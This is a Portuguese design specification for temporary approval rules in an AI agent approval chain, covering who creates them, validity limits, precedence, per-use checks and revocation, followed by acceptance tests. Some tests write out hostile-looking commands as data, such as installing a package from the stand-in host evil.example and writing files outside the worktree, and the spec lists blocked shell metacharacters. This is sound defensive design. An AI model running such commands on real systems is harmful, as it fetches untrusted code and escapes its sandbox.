# Regras temporárias de mesa

> **Assunto:** as regras que agentes da cadeia de aprovação criam ao aprovar por um tempo ou um padrão: o que são, quem cria, alcance, validade máxima, lugar na precedência, como chegam ao personagem e como acabam · **Componente:** Motor · **Atualizado:** 2026-10-19

## Objetivo

Deixar um agente da [cadeia de aprovação](cadeia-de-aprovacao.md) liberar por algum tempo, numa mesa, o que ele pode aprovar, sem perguntar de novo a cada repetição e sem criar um decreto: o Grão-Mestre e os Mestres de mesa continuam sem decretos permanentes ([ADR 0024](../decisoes/0024-cadeia-de-aprovacao-por-risco.md)). É um tipo próprio, distinto de [decreto](../telegram/decretos.md).

## Comportamento

### O que é e quem cria

- Nasce de uma resposta de agente a um pedido: **Aprovar por um tempo** (a ação exata) ou **Aprovar o padrão** (um [padrão aprovável](../classes/classificacao-de-risco.md#padrões-aprováveis)) ([respostas](cadeia-de-aprovacao.md#respostas)).
- Quem cria: o Mestre da mesa, só na própria mesa e de risco `baixo` ou `medio` (o `medio` só dos grupos de `cadeia.mesa_decide`, com a [reconferência](#lugar-na-precedência) a cada uso); o Grão-Mestre, na mesa do pedido. Só o que o nível dele pode decidir: o risco da ação ou do padrão cabe no teto dele (com as delegações que tiver) e passa pelas [salvaguardas](cadeia-de-aprovacao.md#salvaguardas).
- **Conteúdo:** o alvo (ação ou padrão, com a impressão), o tipo de ferramenta, a classe de quem pediu e a mesa (vale para os personagens dessa classe naquela mesa), o autor e o nível, o pedido de origem, o risco, a criação e a validade.
- Fica no banco da Cidadela (tabela `table_rules`, [persistência](../arquitetura/persistencia.md)), com histórico de estados (`ativa` → `expirada` | `revogada` | `suspensa`) e a lista do que foi liberado com base nela.

### Validade

- Até o fim da missão do pedido, ou por N horas; sem missão, só por horas.
- Máximo: 24 h (padrão, `cadeia.regra_temporaria_max` no [arquivo de política](../aprovacoes/arquivo-de-politica.md)); pedido de validade maior é recusado.
- Nunca passa do encerramento ou cancelamento da mesa, nem da delegação em que se apoiou.

### Lugar na precedência

- Abaixo das regras fixas e dos decretos de pessoas; acima das regras da classe naquela mesa ([precedência](../arquitetura/precedencia.md#a-ordem)).
- **Só cobre o que cabe no risco dela:** a regra vale para um comando que o padrão casa **e** cuja classificação própria cabe no risco da regra (`PatternCovers`, [o que um padrão cobre](../classes/classificacao-de-risco.md#padrões-aprováveis)); `npm install *` aprovado como `baixo` não libera `npm install -g x` (`medio`), que segue como pedido.
- **Regra `medio` do Mestre da mesa: o motor reconfere a cada comando** que ela cobre, na hora do uso, as [condições da mesa](cadeia-de-aprovacao.md#condições-da-mesa) (o grupo de cada origem está em `cadeia.mesa_decide` agora e a condição dele passa, com a classe, o teto e o worktree de agora) e a classificação própria do comando (`PatternCovers`). Falhou uma (inclusive não conseguir ler a política: falha fechado): a regra não libera aquele comando, que vira pedido no Grão-Mestre, sem registro de execução. A regra `curl *` aprovada como `medio` libera `curl https://pypi.org/x` (domínio listado) e não `curl https://exemplo.io`. Tirar um grupo da lista, ou a [pausa de autonomia](supervisao-da-cadeia.md#pausa-de-autonomia), suspende o que a regra liberava.
- **Só transforma `ask` em `allow`:** uma ação que alguma camada (classe, teto, ficha) nega continua negada; um decreto de pessoa que proíbe a ação vence. Exceções pontuais e decretos de pessoas que liberam não precisam dela.
- Chega ao personagem nas [regras efetivas](../classes/permissoes.md#regras-efetivas), na lista `decrees`, com `kind: "table_rule"`, `level` do autor (`table_master` ou `grand_master`), o efeito `permission` (`allow` de `commands` ou `tools`) e `until`; a decisão a aplica na própria máquina, como os decretos. Não vira regra nativa e, como as exceções pontuais, não vale em [modo degradado](../classes/permissoes.md#modo-degradado).
- Ao liberar uma ação, o motor registra a execução na regra (ação, quando, quem).

### Como acaba

- **Sozinha:** no fim da validade, no fim da missão, no encerramento ou cancelamento da mesa, quando acaba a delegação em que se apoiou e quando o autor deixa de ser o Mestre daquela mesa.
- **Revogada:** pelo autor; pelo Grão-Mestre, qualquer uma do workspace; por um Administrador ou acima, no painel ou na lista de `/decretos` ([administração](../painel/administracao.md), M6; [bot](../telegram/bot.md), M5); e todas de uma vez pelo botão de emergência do Dono ([delegação](../aprovacoes/delegacao.md#revogar-tudo)).
- **Suspensa** com `/travar`, como os decretos, e reativada ao destravar.
- O que já foi executado continua no histórico. Cada fim avisa o autor pela caixa de entrada.

### Como o motor decide o que o texto deixa em aberto

- **Quem cria:** o superior agente que não é Mestre decide `baixo`; o Mestre da mesa e o Grão-Mestre, até `medio` (o Grão-Mestre de qualquer grupo; `alto` por delegação do Dono é do M5). O nível do decreto nas regras efetivas é `table_master` para o agente comum e o Mestre da mesa, `grand_master` para o Grão-Mestre. O risco da regra é o do padrão (ou o da ação exata, em "aprovar por um tempo"); o padrão `medio` do Mestre só é aceito se todos os grupos que ele alcança estão em `cadeia.mesa_decide` e a autonomia da mesa não está em pausa.
- **Validade:** `--for` até o máximo; "até o fim da missão" amarra a regra à missão em que o personagem que pediu está e ainda a limita ao máximo (personagem sem missão → `bad_answer`, "use `--for`"). A regra de "aprovar o padrão" sem `--for` vale o máximo.
- **No documento:** `Rules.Decrees` ganha `kind: "table_rule"` com `risk`, `tool_kind`, `until` e o padrão em `effect.allow.commands` (shell) ou `tools`; a regra da ação exata leva `action` no lugar do padrão. A regra não entra na decisão dos decretos de pessoas nem nas exceções, e nunca levanta bloqueio nativo.
- **A cada uso** (`Env.TableRules`, posto pelo `hook.Engine.TableRules`; depois das regras fixas e das exceções): só vira `allow` um `ask` que o motor sabe analisar (nunca o trecho que ele não analisa); o comando não pode ter `;`, `&`, `|`, crase, `$(`, `<`, `>`, `(`, `)`, `{`, `}` nem quebra de linha, e a regra nunca libera uma classificação com `sem_grupo` (aspa aberta, lista `{a,b}`, chamada .NET, leitura do shell, e também a escrita e a ferramenta (MCP, do provedor) sem linha na tabela, e a ferramenta de web sem URL), seja a de um padrão ou a da ação exata, de qualquer nível, o Grão-Mestre inclusive (o mesmo texto que o motor não lê por inteiro faz outra coisa a cada uso; e a quebra de linha, ou um espaço que só o motor lê como espaço (`\f`, `\v`, espaço sem quebra), no começo ou no fim do comando valem como a ferramenta mandou, não como a ação os guarda aparados: para o shell, `./run.sh` seguido de um espaço sem quebra é outro arquivo; só espaços, tabs e fins de linha nas pontas são aparados); o que o motor classifica e não lê por dentro, como o comando simples que roda um script do worktree (`script_alterado`), segue coberto, e o script de cada uso é o que estiver lá, na pasta em que o comando rodar, pois a regra da ação exata não guarda a pasta; a de uma ferramenta que tem linha na tabela do Dono vale pelo nome dela, como a tabela a classifica: quem aprova por um tempo aceita isso, e o freio são a atenuação (que julga a chamada como se rodasse no worktree), a auditoria de cada uso, a revogação e, na regra `medio` do Mestre da mesa, a pausa de autonomia; a classificação própria cabe no risco da regra (`PatternCovers`); e o *portão* confere de novo no banco: regra ativa e dentro da validade, personagem da classe e da mesa dela, autor ainda no lugar, missão e mesa em andamento, as regras do próprio autor sem negar aquela chamada (a atenuação, de novo, na chamada que usa a regra: um padrão alcança chamadas que o autor não viu), a regra de um superior agente só para os subordinados dele (não para a classe toda da mesa) e, no `medio` do Mestre da mesa, pausa de autonomia e `MesaGroupsHold` (os grupos em `cadeia.mesa_decide` e a rede só para domínios da classe e do teto, de agora). Qualquer erro do portão deixa o `ask`. Cada liberação grava uma linha em `table_rule_uses`.
- **Banco:** `table_rules` (a regra), `table_rule_states` (o histórico dos estados, com o motivo e quem) e `table_rule_uses` (o que liberou). O `Sweep` do motor (1 min) expira o que acabou e avisa o autor pela caixa de entrada; `Revoke`, `RevokeAll`, `Suspend` e `Resume` são o que a lista de decretos, o painel e o `/travar` chamam no M5 e M6. A delegação em que uma regra se apoiou só existe no M5.

## Regras e erros

- Regra temporária pedida por quem não está no nível do pedido, fora da mesa dele, acima do teto dele, `medio` de grupo fora de `cadeia.mesa_decide` ou com validade acima do máximo: recusada, e o pedido segue onde estava.
- "Aprovar por um tempo" um pedido com trecho que o motor não analisa (`sem_grupo`) ou com comando encadeado (as mesmas condições do uso, acima): recusado com `bad_answer` e nenhuma regra nasce; a saída é "aprovar agora", a exceção de um uso.
- Um decreto de pessoa nunca é sobreposto por uma regra temporária; conflito entre duas regras temporárias não existe, porque elas só liberam.
- O Grão-Mestre e os Mestres de mesa nunca transformam uma regra temporária em decreto; o "sempre" deles vira sugestão no resumo do Dono ([respostas](cadeia-de-aprovacao.md#respostas)).

## Critérios de aceite

- **CA-RTM-01** · *rápida* — **Dado** o Mestre da mesa `42-login` e um pedido `npm install x` de um Dev, **quando** ele aprova o padrão `npm install *` por 2 h, **então** um `npm install y` de outro Dev da mesma mesa passa sem pedido, um Dev de outra mesa ainda pede, e, com o relógio falso 2 h depois, o mesmo comando volta a pedir.
- **CA-RTM-02** · *rápida* — **Dado** uma regra temporária para `npm install *` e a classe com `npm install evil` em `commands.deny`, **quando** chega `npm install evil`, **então** é negado; **dado** um decreto de um Aprovador que proíbe `npm install *` na mesa, **então** a regra temporária não libera nada.
- **CA-RTM-03** · *rápida* — **Dado** o Mestre da mesa, **quando** pede uma regra temporária de 48 h, uma em outra mesa ou uma para `pip *` (num pedido `pip install x`, `medio` de `pacotes_e_executores`, o padrão alcança `instalacao_e_sistema`, fora da lista padrão), **então** as três são recusadas e o pedido segue no nível dele; e um pedido `npm install -g x` nem chega a ele (nasce no Grão-Mestre).
- **CA-RTM-04** · *rápida* — **Dado** uma regra temporária "até o fim da missão", **quando** a missão termina ou a mesa é encerrada, **então** ela fica `expirada` e o autor é avisado; **quando** o Grão-Mestre revoga outra, **então** ela fica `revogada` e a próxima ação volta a pedir.
- **CA-RTM-05** · *rápida* — **Dado** uma regra temporária ativa, **quando** a Cidadela monta as regras efetivas do personagem, **então** o documento traz em `decrees` um item `kind: "table_rule"`, `level: "table_master"`, `until` e o padrão em `allow.commands`, e o retrato `policy.json` do modo degradado não o usa para liberar nada.
- **CA-RTM-06** · *rápida* — **Dado** uma regra temporária do Mestre da mesa para `npm install *` (`baixo`), **quando** chegam `npm install y`, `npm install -g x` e `npm install https://evil.example/x.tgz`, **então** o primeiro passa pela regra e os outros dois (`medio`) viram pedido que nasce no Grão-Mestre, sem registro de execução na regra.
- **CA-RTM-07** · *rápida* — **Dado** o Mestre da mesa e a política padrão, **quando** ele aprova o padrão `curl *` (`medio`) por 2 h e chegam `curl https://pypi.org/x` (domínio no `network.domains` da classe), `curl https://exemplo.io` e `curl -o ../fora/x https://pypi.org/x`, **então** o primeiro passa pela regra, com registro de execução, e os outros dois (condição de rede e caminho fora do worktree falham) viram pedido no Grão-Mestre; **quando** o Dono tira `rede` de `cadeia.mesa_decide` e o arquivo é carregado, **então** o primeiro volta a ser pedido, e a regra volta a valer se o grupo voltar à lista.
- **CA-RTM-08** · *rápida* — **Dado** uma regra `medio` do Mestre da mesa para `docker compose up *` e a mesa em pausa de autonomia, **quando** chega `docker compose up -d`, **então** vira pedido no Grão-Mestre; **quando** a pausa é retomada, **então** o mesmo comando passa pela regra; **dado** o padrão `docker *` (alcança `docker push`, `alto`), **então** a regra é recusada (risco `alto`, acima do teto dele).
- **CA-RTM-09** · *rápida* — **Dado** um pedido `medio` com trecho que o motor não analisa (`alias ll=ls`, que nasce no Grão-Mestre), outro de comando encadeado (`make build && ./run.sh`, no Mestre da mesa), outro de um script do worktree com um espaço sem quebra no fim (no Mestre da mesa) e um de ferramenta sem linha na tabela (uma ferramenta MCP), **quando** o nível responde "aprovar por um tempo" (por horas ou até o fim da missão), **então** é recusado com `bad_answer`, nenhuma regra nasce e o pedido segue onde estava, e "aprovar agora" segue possível para cada um; **dado** uma regra da ação exata desses comandos, ou de um comando com quebra de linha ou espaço de outra escrita nas pontas que a ação guarda aparados, feita por outro caminho, **quando** o comando chega, **então** nem o motor nem o portão a usam e nada é registrado como uso.
- **CA-RTM-10** · *rápida* — **Dado** a seção `cadeia` com `regra_temporaria_max: 7d` e `resumo_mesas: 30d`, **quando** é carregada, **então** valem 7 e 30 dias; **dado** `regra_temporaria_max: 8d` ou `resumo_mesas: xd`, **então** o carregamento é recusado.

## Depende de

- [Cadeia de aprovação](cadeia-de-aprovacao.md) · [Mesas](mesas.md) · [Missões](missoes.md)
- [Permissões](../classes/permissoes.md) (regras efetivas) · [Precedência](../arquitetura/precedencia.md)
